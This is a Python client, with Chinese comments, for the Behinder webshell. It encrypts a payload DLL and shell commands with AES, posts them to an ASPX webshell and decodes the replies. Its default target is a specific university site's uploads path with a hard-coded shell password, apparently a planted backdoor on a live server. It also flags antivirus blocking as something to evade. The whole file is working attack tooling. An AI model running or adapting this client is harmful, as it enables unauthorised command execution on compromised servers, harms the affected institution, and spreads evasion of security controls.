#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""迷你冰蝎客户端: 完整协议验证/命令执行 (不依赖冰蝎GUI)

用法:
  python behinder_mini_client.py "whoami"
  python behinder_mini_client.py -u http://target/shell.aspx -p Aa123456 -d Cmd.dll "ipconfig /all"

协议: body = [DLL] + 0x7E*6 + "字段:base64(值),..." 整体 AES-128-CBC(IV=key,PKCS7) 加密
     响应 = [可选明文前缀] + AES加密JSON (值全base64)
依赖: pip install requests cryptography
"""
import argparse
import base64
import hashlib
import re
import urllib3
import requests
urllib3.disable_warnings()
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding as sympad

DEFAULT_URL = "http://rec.usc.edu.ph/Content/Uploads/2291_student3.aspx"
DEFAULT_PASS = "Aa123456"
SHELL_PREFIXES = (b"Welcome You!<html>\n</html>\n{;}\n",)  # 混淆马明文前缀, 按需增补


def md5key(password):
    """冰蝎密钥 = MD5(密码) hex 前16位 的 ASCII 字节"""
    return hashlib.md5(password.encode()).hexdigest()[:16].encode()


def enc_body(key, dll, params):
    tail = ",".join(f"{k}:{base64.b64encode(v.encode()).decode()}" for k, v in params.items()).encode()
    body = dll + b"~~~~~~" + tail
    padder = sympad.PKCS7(128).padder()
    data = padder.update(body) + padder.finalize()
    c = Cipher(algorithms.AES(key), modes.CBC(key)).encryptor()
    return c.update(data) + c.finalize()


def run(url, key, dll_path, params, timeout=25):
    dll = open(dll_path, "rb").read()
    r = requests.post(url, data=enc_body(key, dll, params),
                      headers={"Content-Type": "application/octet-stream"}, timeout=timeout)
    if "contains a virus" in r.text:
        return {"error": "被杀软拦截 (0x800700E1), 需载荷免杀"}
    if r.status_code != 200:
        m = re.search(r"<b> Exception Details: </b>(.*?)<br", r.text, re.S)
        return {"error": f"HTTP {r.status_code}: {m.group(1).strip()[:90] if m else r.text[:100]}"}
    raw = r.content
    for pre in SHELL_PREFIXES:
        if raw.startswith(pre):
            raw = raw[len(pre):]
    # 枚举 PKCS7 pad (响应密文长度不定)
    for pad in range(16, 0, -1):
        if pad >= len(raw):
            continue
        data = raw[:-pad]
        if len(data) % 16:
            continue
        try:
            c = Cipher(algorithms.AES(key), modes.CBC(key)).decryptor()
            dec = c.update(data) + c.finalize()
            txt = dec.decode("utf-8", "replace")
            if '"status"' in txt or '"msg"' in txt:
                info = {}
                for m in re.finditer(r'"([^"]+)":"([^"]*)"', txt):
                    try:
                        info[m.group(1)] = base64.b64decode(m.group(2)).decode("utf-8", "replace")
                    except Exception:
                        info[m.group(1)] = m.group(2)
                return info
        except Exception:
            pass
    return {"error": f"响应解析失败 (len={len(raw)})"}


if __name__ == "__main__":
    ap = argparse.ArgumentParser(description="迷你冰蝎客户端")
    ap.add_argument("-u", "--url", default=DEFAULT_URL)
    ap.add_argument("-p", "--password", default=DEFAULT_PASS)
    ap.add_argument("-d", "--dll", default="Cmd.dll", help="载荷DLL路径 (默认当前目录 Cmd.dll)")
    ap.add_argument("cmd", nargs="*", help="要执行的命令 (Cmd载荷)")
    args = ap.parse_args()

    key = md5key(args.password)
    if "Cmd" in args.dll:
        params = {"cmd": " ".join(args.cmd) or "whoami"}
    else:
        params = {"sessionId": "t"}  # BasicInfo 等载荷至少需要 sessionId
    print(run(args.url, key, args.dll, params))
